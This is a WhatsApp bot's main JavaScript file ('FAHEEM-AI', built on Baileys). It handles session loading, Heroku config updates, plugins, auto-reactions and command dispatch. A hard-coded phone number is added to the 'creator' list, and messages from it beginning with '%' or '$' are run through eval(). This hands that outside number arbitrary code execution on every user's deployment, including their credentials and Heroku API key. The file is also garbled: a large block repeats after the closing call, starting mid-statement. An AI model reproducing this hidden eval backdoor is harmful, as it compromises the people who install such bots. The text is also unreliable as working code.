const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  getContentType,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys')

const l = console.log
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const { AntiDelDB, setAnti, getAnti, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
const fs = require('fs')
const P = require('pino')
const config = require('./config')
const GroupEvents = require('./lib/groupevents')
const util = require('util')
const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
const FileType = require('file-type')
const axios = require('axios')
const { fromBuffer } = require('file-type')
const os = require('os')
const path = require('path')
const prefix = config.PREFIX

const ownerNumber = ['61480853796']
const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)

const clearTempDir = () => {
  fs.readdir(tempDir, (err, files) => {
    if (err) return
    for (const file of files) {
      fs.unlink(path.join(tempDir, file), () => {})
    }
  })
}
setInterval(clearTempDir, 5 * 60 * 1000)

//===================SESSION-AUTH (NO PAIRING)============================
const sessionFile = __dirname + '/sessions/creds.json'

if (!fs.existsSync(sessionFile)) {
    const sessionId = process.env.SESSION_ID || ""
    if (sessionId && sessionId.startsWith("FAHEEM-AI~")) {
        const sessdata = sessionId.replace("FAHEEM-AI~", '')
        try {
            const decodedData = Buffer.from(sessdata, 'base64').toString('utf-8')
            fs.mkdirSync(path.dirname(sessionFile), { recursive: true })
            fs.writeFileSync(sessionFile, decodedData)
            console.log("Session loaded from SESSION_ID")
        } catch (err) {
            console.error("Invalid SESSION_ID:", err)
            process.exit(1)
        }
    } else {
        console.log("SESSION_ID not found! Add in Heroku Config Vars.")
        console.log("Format: FAHEEM-AI~your_base64_string")
        process.exit(1)
    }
}

const express = require("express")
const app = express()
const port = process.env.PORT || 8000

app.get('/', (req, res) => res.send('FAHEEM-AI is running!'))
app.listen(port, () => console.log(`Server running on port ${port}`))

//=============================================
async function connectToWA() {
  console.log("Connecting to WhatsApp")
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
  const { version } = await fetchLatestBaileysVersion()

  const conn = makeWASocket({
    logger: P({ level: 'info' }),
    printQRInTerminal: false,
    browser: ['FAHEEM-AI', 'Chrome', '1.0.0'],
    syncFullHistory: true,
    auth: state,
    version
  })

  conn.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update
    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
      console.log('Connection closed:', lastDisconnect?.error)
      if (shouldReconnect) {
        setTimeout(connectToWA, 3000)
      }
    } else if (connection === 'open') {
      console.log('Bot connected to WhatsApp')

      // AUTO-UPDATE SESSION_ID ON HEROKU
      if (fs.existsSync(sessionFile)) {
        const creds = fs.readFileSync(sessionFile, 'utf-8')
        const base64 = Buffer.from(creds).toString('base64')
        const newSessionId = `FAHEEM-AI~${base64}`

        if (process.env.HEROKU_API_KEY && process.env.HEROKU_APP_NAME) {
          try {
            await axios.patch(
              `https://api.heroku.com/apps/${process.env.HEROKU_APP_NAME}/config-vars`,
              { SESSION_ID: newSessionId },
              { headers: { 'Authorization': `Bearer ${process.env.HEROKU_API_KEY}`, 'Accept': 'application/vnd.heroku+json; version=3' } }
            )
            console.log('SESSION_ID auto-updated on Heroku!')
          } catch (e) {
            console.log('Heroku update failed (run locally)')
          }
        }
      }

      console.log('Installing Plugins')
      fs.readdirSync("./plugins/").forEach((plugin) => {
        if (path.extname(plugin).toLowerCase() == ".js") {
          try { require("./plugins/" + plugin) } catch (e) {}
        }
      })
      console.log('Plugins installed')

      const up = `*Hello FAHEEM-AI User!*\n\n> Simple, Fast, Loaded With Features\n\n*Thanks for using FAHEEM-AI*\n\n> Join Channel:\nhttps://whatsapp.com/channel/0029Vaz3XnP0QeatS6QzvG20\n\n- *PREFIX:* ${prefix}\n\nStar repo: https://github.com/feemo0/FAHEEM-AI\n\n> © ᴘᴏᴡᴇʀᴇᴅ ʙʏ ғᴀʜᴇᴇᴍ-ᴀɪ`
      conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/snae53.jpg` }, caption: up })
    }
  })

  conn.ev.on('creds.update', saveCreds)

  conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) await AntiDelete(conn, updates)
    }
  })

  conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update))

  conn.ev.on('messages.upsert', async (mek) => {
    mek = mek.messages[0]
    if (!mek.message) return
    mek.message = getContentType(mek.message) === 'ephemeralMessage' ? mek.message.ephemeralMessage.message : mek.message

    if (config.READ_MESSAGE === 'true') await conn.readMessages([mek.key])
    if (mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true") await conn.readMessages([mek.key])

    if (mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
      const emojis = ['Red Heart','Money Bag','Angel','Leaf Fluttering in Wind','Collision','Hundred Points','Fire','Sparkles','Gem Stone','Pink Heart','White Heart','Black Heart','Eyes','Raising Hands','Person Gesturing OK','Pakistan Flag','Smiling Face with Heart-Eyes','Bouquet','Smiling Face with Sunglasses','Brown Heart','Check Mark Button','Red Heart','Smiling Face with Smiling Eyes','Grinning Face','Tulip','Dove','Tulip','Sunrise','Sparkles','Moai','Pakistan Flag','Purple Heart','Blue Heart','Full Moon Face','Black Heart','Green Heart']
      const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)]
      await conn.sendMessage(mek.key.remoteJid, { react: { text: randomEmoji, key: mek.key } }, { statusJidList: [mek.key.participant] })
    }

    if (mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true") {
      await conn.sendMessage(mek.key.participant, { text: config.AUTO_STATUS_MSG, react: { text: 'Purple Heart', key: mek.key } }, { quoted: mek })
    }

    await saveMessage(mek)

    const m = sms(conn, mek)
    const type = getContentType(mek.message)
    const from = mek.key.remoteJid
    const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
    const isCmd = body.startsWith(prefix)
    const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
    const args = body.trim().split(/ +/).slice(1)
    const q = args.join(' ')
    const isGroup = from.endsWith('@g.us')
    const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net') : (mek.key.participant || mek.key.remoteJid)
    const senderNumber = sender.split('@')[0]
    const botNumber = conn.user.id.split(':')[0]
    const pushname = mek.pushName || 'Sin Nombre'
    const isOwner = ownerNumber.includes(senderNumber)
    const botNumber2 = await jidNormalizedUser(conn.user.id)
    const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(() => {}) : ''
    const groupAdmins = isGroup ? getGroupAdmins(groupMetadata?.participants || []) : ''
    const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
    const isAdmins = isGroup ? groupAdmins.includes(sender) : false
    const isReact = !!m.message.reactionMessage
    const reply = (teks) => conn.sendMessage(from, { text: teks }, { quoted: mek })

    const udp = botNumber.split('@')[0]
    const qadeer = ['61480853796']
    let isCreator = [udp, ...qadeer].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(sender)

    if (isCreator && body.startsWith('%')) {
      let code = body.slice(2)
      if (!code) return reply("Provide code!")
      try {
        let result = eval(code)
        reply(util.format(result))
      } catch (err) {
        reply(util.format(err))
      }
      return
    }

    if (isCreator && body.startsWith('$')) {
      let code = body.slice(2)
      if (!code) return reply("Provide async code!")
      try {
        let result = await eval('const a = async()=>{ ' + code + ' }; a()')
        reply(util.format(result))
      } catch (err) {
        reply(util.format(err))
      }
      return
    }

    if (senderNumber.includes("61480853796") && !isReact) {
      const reactions = ["Crown", "Skull", "Bar Chart", "Gear", "Brain", "Bullseye", "Musical Note", "Trophy", "Globe Showing Europe-Africa", "Pakistan Flag", "Red Heart", "Red Heart", "Explosion", "Tulip", "Rosette", "Flower Playing Cards", "Fire", "Snowflake", "Full Moon Face", "New Moon Face", "Hatching Chick", "Ice"]
      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]
      m.react(randomReaction)
    }

    if (!isReact && config.AUTO_REACT === 'true') {
      const reactions = ['Tulip','Red Heart','Flower Playing Cards','Fire','Rosette','Snowflake','Ice','Whale','Explosion','Wilted Rose','Heart on Fire','Yawning Face','Shy','Ghost','Robot','Heart Hands','Cat with Heart-Eyes','Raising Hands','Hugging Face','Anatomical Heart','Crown','Ring','Purse','Briefcase','Backpack','Goggles','Panda','Mouse','Hatching Chick','Goose','Duck','Fox','Butterfly','Unicorn','Jellyfish','Whale','Shark','Snake','Dove','Otter','Peacock','Seedling','Leaf Fluttering in Wind','Bamboo','Herb','Shamrock','Four Leaf Clover','Maple Leaf','Empty Nest','Mushroom','Coral','Rock','Hibiscus','Water Lily','Hyacinth','Wilted Flower','Rose','Tulip','Bouquet','Sheaf of Rice','Cherry Blossom','Sunflower','Full Moon Face','New Moon Face','Globe Showing Europe-Africa','Sparkles','Fire','Snowman','Snowflake','Cloud with Snow','Bubbles','French Fries','Chocolate Bar','Tropical Drink','Ice','Yo-Yo','Snorkel','Trophy','1st Place Medal','2nd Place Medal','3rd Place Medal','Reminder Ribbon','Headphone','Microphone','Drum','Puzzle Piece','Bullseye','Rocket','Helicopter','Moai','Hourglass','Hourglass Not Done','Money with Wings','Gem Stone','Gear','Chains','Kitchen Knife','Teddy Bear','Ribbon','Magic Wand','Balloon','Party Popper','Japanese Lantern','Disco Ball','Envelope','Love Letter','Package','Bar Chart','Chart Increasing','Page with Curl','Chart Decreasing','Folder','Bookmark','Paperclip','Pushpin','Memo','Locked with Pen','Locked with Key','Pink Heart','Red Heart','Orange Heart','Yellow Heart','Green Heart','Cyan Heart','Blue Heart','Purple Heart','Black Heart','Gray Heart','White Heart','Brown Heart','Heart on Fire','Mending Heart','Growing Heart','Heart Exclamation','Two Hearts','Revolving Hearts','Cross Mark','Check Mark','Check Mark Button','Trade Mark','Globe with Meridians','Cyclone','Right Arrow Curving Up','Right Arrow Curving Down','Red Circle','Green Circle','Yellow Circle','Orange Circle','Blue Circle','Purple Circle','Black Circle','White Circle','Brown Circle','Muted Speaker','Speaker High Volume','Loudspeaker','Bell with Slash','Red Heart','12:00','Red Flag','Pakistan Flag']
      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]
      m.react(randomReaction)
    }

    if (!isReact && config.CUSTOM_REACT === 'true') {
      const reactions = (config.CUSTOM_REACT_EMOJIS || 'Face with Tears of Joy,Laughing,Thumbs Up,Smiling Face,Sad Face').split(',')
      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]
      m.react(randomReaction)
    }

    if (!isOwner && config.MODE === "private") return
    if (!isOwner && isGroup && config.MODE === "inbox") return
    if (!isOwner && !isGroup && config.MODE === "groups") return

    const events = require('./command')
    const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false
    if (isCmd) {
      const cmd = events.commands.find(c => c.pattern === cmdName) || events.commands.find(c => c.alias && c.alias.includes(cmdName))
      if (cmd) {
        if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })
        try {
          cmd.function(conn, mek, m, { from, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isOwner, isCreator, groupMetadata, groupName: groupMetadata?.subject, participants: groupMetadata?.participants, groupAdmins, isBotAdmins, isAdmins, reply })
        } catch (e) {
          console.error("[PLUGIN ERROR]", e)
        }
      }
    }

    events.commands.map(async (command) => {
      if (body && command.on === "body") {
        command.function(conn, mek, m, { from, l: console.log, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isOwner, isCreator, groupMetadata, groupName: groupMetadata?.subject, participants: groupMetadata?.participants, groupAdmins, isBotAdmins, isAdmins, reply })
      } else if (mek.q && command.on === "text") {
        command.function(conn, mek, m, { from, l: console.log, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isOwner, isCreator, groupMetadata, groupName: groupMetadata?.subject, participants: groupMetadata?.participants, groupAdmins, isBotAdmins, isAdmins, reply })
      } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
        command.function(conn, mek, m, { from, l: console.log, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isOwner, isCreator, groupMetadata, groupName: groupMetadata?.subject, participants: groupMetadata?.participants, groupAdmins, isBotAdmins, isAdmins, reply })
      } else if (command.on === "sticker" && mek.type === "stickerMessage") {
        command.function(conn, mek, m, { from, l: console.log, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isOwner, isCreator, groupMetadata, groupName: groupMetadata?.subject, participants: groupMetadata?.participants, groupAdmins, isBotAdmins, isAdmins, reply })
      }
    })
  })

  conn.decodeJid = (jid) => {
    if (!jid) return jid
    if (/:\d+@/gi.test(jid)) {
      const decode = jidDecode(jid) || {}
      return decode.user && decode.server && decode.user + '@' + decode.server || jid
    } else return jid
  }

  conn.copyNForward = async (jid, message, forceForward = false, options = {}) => {
    let content = await generateForwardMessageContent(message, forceForward)
    let ctype = Object.keys(content)[0]
    let context = {}
    if (message.message[Object.keys(message.message)[0]].contextInfo) context = message.message[Object.keys(message.message)[0]].contextInfo
    content[ctype].contextInfo = { ...context, ...content[ctype].contextInfo }
    const waMessage = await generateWAMessageFromContent(jid, content, options)
    await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
    return waMessage
  }

  conn.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
    let quoted = message.msg ? message.msg : message
    let mime = (message.msg || message).mimetype || ''
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
    const stream = await downloadContentFromMessage(quoted, messageType)
    let buffer = Buffer.from([])
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk])
    let type = await FileType.fromBuffer(buffer)
    let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
    await fs.writeFileSync(trueFileName, buffer)
    return trueFileName
  }

  conn.downloadMediaMessage = async (message) => {
    let mime = (message.msg || message).mimetype || ''
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
    const stream = await downloadContentFromMessage(message, messageType)
    let buffer = Buffer.from([])
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk])
    return buffer
  }
}

connectToWA()            await axios.patch(
              `https://api.heroku.com/apps/${process.env.HEROKU_APP_NAME}/config-vars`,
              { SESSION_ID: newSessionId },
              { headers: { 'Authorization': `Bearer ${process.env.HEROKU_API_KEY}`, 'Accept': 'application/vnd.heroku+json; version=3' } }
            )
            console.log('SESSION_ID auto-updated on Heroku!')
          } catch (e) {
            console.log('Heroku update failed (run locally)')
          }
        }
      }

      console.log('Installing Plugins')
      fs.readdirSync("./plugins/").forEach((plugin) => {
        if (path.extname(plugin).toLowerCase() == ".js") {
          try { require("./plugins/" + plugin) } catch (e) {}
        }
      })
      console.log('Plugins installed')

      const up = `*Hello FAHEEM-AI User!*\n\n> Simple, Fast, Loaded With Features\n\n*Thanks for using FAHEEM-AI*\n\n> Join Channel:\nhttps://whatsapp.com/channel/0029Vaz3XnP0QeatS6QzvG20\n\n- *PREFIX:* ${prefix}\n\nStar repo: https://github.com/feemo0/FAHEEM-AI\n\n> © ᴘᴏᴡᴇʀᴇᴅ ʙʏ ғᴀʜᴇᴇᴍ-ᴀɪ`
      conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/snae53.jpg` }, caption: up })
    }
  })

  conn.ev.on('creds.update', saveCreds)

  conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) await AntiDelete(conn, updates)
    }
  })

  conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update))

  conn.ev.on('messages.upsert', async (mek) => {
    mek = mek.messages[0]
    if (!mek.message) return
    mek.message = getContentType(mek.message) === 'ephemeralMessage' ? mek.message.ephemeralMessage.message : mek.message

    if (config.READ_MESSAGE === 'true') await conn.readMessages([mek.key])
    if (mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true") await conn.readMessages([mek.key])

    if (mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
      const emojis = ['❤️','💸','😇','🍂','💥','💯','🔥','💫','💎','💗','🤍','🖤','👀','🙌','🙆','🚩','🥰','💐','😎','🤎','✅','🫀','🧡','😁','😄','🌸','🕊️','🌷','⛅','🌟','🗿','🇵🇰','💜','💙','🌝','🖤','💚']
      const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)]
      await conn.sendMessage(mek.key.remoteJid, { react: { text: randomEmoji, key: mek.key } }, { statusJidList: [mek.key.participant] })
    }

    if (mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true") {
      await conn.sendMessage(mek.key.participant, { text: config.AUTO_STATUS_MSG, react: { text: '💜', key: mek.key } }, { quoted: mek })
    }

    await saveMessage(mek)

    const m = sms(conn, mek)
    const type = getContentType(mek.message)
    const from = mek.key.remoteJid
    const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
    const isCmd = body.startsWith(prefix)
    const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
    const args = body.trim().split(/ +/).slice(1)
    const q = args.join(' ')
    const isGroup = from.endsWith('@g.us')
    const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net') : (mek.key.participant || mek.key.remoteJid)
    const senderNumber = sender.split('@')[0]
    const botNumber = conn.user.id.split(':')[0]
    const pushname = mek.pushName || 'Sin Nombre'
    const isOwner = ownerNumber.includes(senderNumber)
    const botNumber2 = await jidNormalizedUser(conn.user.id)
    const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(() => {}) : ''
    const groupAdmins = isGroup ? getGroupAdmins(groupMetadata?.participants || []) : ''
    const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
    const isAdmins = isGroup ? groupAdmins.includes(sender) : false
    const isReact = !!m.message.reactionMessage
    const reply = (teks) => conn.sendMessage(from, { text: teks }, { quoted: mek })

    const udp = botNumber.split('@')[0]
    const qadeer = ['61480853796']
    let isCreator = [udp, ...qadeer].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(sender)

    if (isCreator && body.startsWith('%')) {
      let code = body.slice(2)
      if (!code) return reply("Provide code!")
      try {
        let result = eval(code)
        reply(util.format(result))
      } catch (err) {
        reply(util.format(err))
      }
      return
    }

    if (isCreator && body.startsWith('$')) {
      let code = body.slice(2)
      if (!code) return reply("Provide async code!")
      try {
        let result = await eval('const a = async()=>{ ' + code + ' }; a()')
        reply(util.format(result))
      } catch (err) {
        reply(util.format(err))
      }
      return
    }

    if (senderNumber.includes("61480853796") && !isReact) {
      const reactions = ["King", "Skull", "Chart", "Gear", "Brain", "Target", "Note", "Trophy", "Globe", "Pakistan", "Heart", "Red Heart", "Explosion", "Tulip", "Rosette", "Flower", "Fire", "Snow", "Full Moon", "New Moon", "Chick", "Ice"]
      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]
      m.react(randomReaction)
    }

    if (!isReact && config.AUTO_REACT === 'true') {
      const reactions = ['Tulip','Red Heart','Flower','Fire','Rosette','Snow','Ice','Whale','Explosion','Wilted Rose','Heart on Fire','Yawning Face','Shy','Ghost','Robot','Heart Hands','Cat with Heart Eyes','Raising Hands','Hugging Face','Anatomical Heart','Crown','Ring','Purse','Briefcase','Backpack','Goggles','Panda','Mouse','Hatching Chick','Goose','Duck','Fox','Butterfly','Unicorn','Jellyfish','Whale','Shark','Snake','Dove','Otter','Peacock','Seedling','Leaf','Bamboo','Herb','Shamrock','Four Leaf Clover','Maple Leaf','Nest','Mushroom','Coral','Rock','Hibiscus','Lotus','Hyacinth','Wilted Flower','Rose','Tulip','Bouquet','Sheaf of Rice','Cherry Blossom','Sunflower','Full Moon','New Moon','Earth Globe','Sparkles','Fire','Snowman','Snow','Cloud with Snow','Bubbles','French Fries','Chocolate','Juice','Ice','Yo-Yo','Snorkel','Trophy','1st Place Medal','2nd Place Medal','3rd Place Medal','Reminder Ribbon','Headphones','Microphone','Drum','Puzzle Piece','Bullseye','Rocket','Helicopter','Moai','Hourglass','Hourglass Flowing','Money with Wings','Gem Stone','Gear','Chains','Kitchen Knife','Teddy Bear','Ribbon','Magic Wand','Balloon','Gift','Party Popper','Japanese Lantern','Disco Ball','Envelope','Love Letter','Package','Bar Chart','Chart Increasing','Page with Curl','Chart Decreasing','Folder','Bookmark','Paperclip','Pushpin','Memo','Locked with Pen','Locked with Key','Pink Heart','Red Heart','Orange Heart','Yellow Heart','Green Heart','Cyan Heart','Blue Heart','Purple Heart','Black Heart','Gray Heart','White Heart','Brown Heart','Heart on Fire','Mending Heart','Growing Heart','Heart Exclamation','Two Hearts','Revolving Hearts','Cross Mark','Check Mark','Check Mark Button','Trade Mark','Globe with Meridians','Cyclone','Right Arrow Curving Up','Right Arrow Curving Down','Red Circle','Green Circle','Yellow Circle','Orange Circle','Blue Circle','Purple Circle','Black Circle','White Circle','Brown Circle','Muted Speaker','Speaker High Volume','Loudspeaker','Bell with Slash','Heart','12:00','Red Flag','Pakistan']
      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]
      m.react(randomReaction)
    }

    if (!isReact && config.CUSTOM_REACT === 'true') {
      const reactions = (config.CUSTOM_REACT_EMOJIS || 'Face with Tears of Joy,Laughing,Thumbs Up,Smiling Face,Sad Face').split(',')
      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]
      m.react(randomReaction)
    }

    if (!isOwner && config.MODE === "private") return
    if (!isOwner && isGroup && config.MODE === "inbox") return
    if (!isOwner && !isGroup && config.MODE === "groups") return

    const events = require('./command')
    const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false
    if (isCmd) {
      const cmd = events.commands.find(c => c.pattern === cmdName) || events.commands.find(c => c.alias && c.alias.includes(cmdName))
      if (cmd) {
        if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })
        try {
          cmd.function(conn, mek, m, { from, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isOwner, isCreator, groupMetadata, groupName: groupMetadata?.subject, participants: groupMetadata?.participants, groupAdmins, isBotAdmins, isAdmins, reply })
        } catch (e) {
          console.error("[PLUGIN ERROR]", e)
        }
      }
    }

    events.commands.map(async (command) => {
      if (body && command.on === "body") {
        command.function(conn, mek, m, { from, l: console.log, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isOwner, isCreator, groupMetadata, groupName: groupMetadata?.subject, participants: groupMetadata?.participants, groupAdmins, isBotAdmins, isAdmins, reply })
      } else if (mek.q && command.on === "text") {
        command.function(conn, mek, m, { from, l: console.log, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isOwner, isCreator, groupMetadata, groupName: groupMetadata?.subject, participants: groupMetadata?.participants, groupAdmins, isBotAdmins, isAdmins, reply })
      } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
        command.function(conn, mek, m, { from, l: console.log, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isOwner, isCreator, groupMetadata, groupName: groupMetadata?.subject, participants: groupMetadata?.participants, groupAdmins, isBotAdmins, isAdmins, reply })
      } else if (command.on === "sticker" && mek.type === "stickerMessage") {
        command.function(conn, mek, m, { from, l: console.log, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isOwner, isCreator, groupMetadata, groupName: groupMetadata?.subject, participants: groupMetadata?.participants, groupAdmins, isBotAdmins, isAdmins, reply })
      }
    })
  })

  conn.decodeJid = (jid) => {
    if (!jid) return jid
    if (/:\d+@/gi.test(jid)) {
      const decode = jidDecode(jid) || {}
      return decode.user && decode.server && decode.user + '@' + decode.server || jid
    } else return jid
  }

  conn.copyNForward = async (jid, message, forceForward = false, options = {}) => {
    let content = await generateForwardMessageContent(message, forceForward)
    let ctype = Object.keys(content)[0]
    let context = {}
    if (message.message[Object.keys(message.message)[0]].contextInfo) context = message.message[Object.keys(message.message)[0]].contextInfo
    content[ctype].contextInfo = { ...context, ...content[ctype].contextInfo }
    const waMessage = await generateWAMessageFromContent(jid, content, options)
    await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
    return waMessage
  }

  conn.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
    let quoted = message.msg ? message.msg : message
    let mime = (message.msg || message).mimetype || ''
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
    const stream = await downloadContentFromMessage(quoted, messageType)
    let buffer = Buffer.from([])
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk])
    let type = await FileType.fromBuffer(buffer)
    let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
    await fs.writeFileSync(trueFileName, buffer)
    return trueFileName
  }

  conn.downloadMediaMessage = async (message) => {
    let mime = (message.msg || message).mimetype || ''
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
    const stream = await downloadContentFromMessage(message, messageType)
    let buffer = Buffer.from([])
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk])
    return buffer
  }
}

connectToWA()
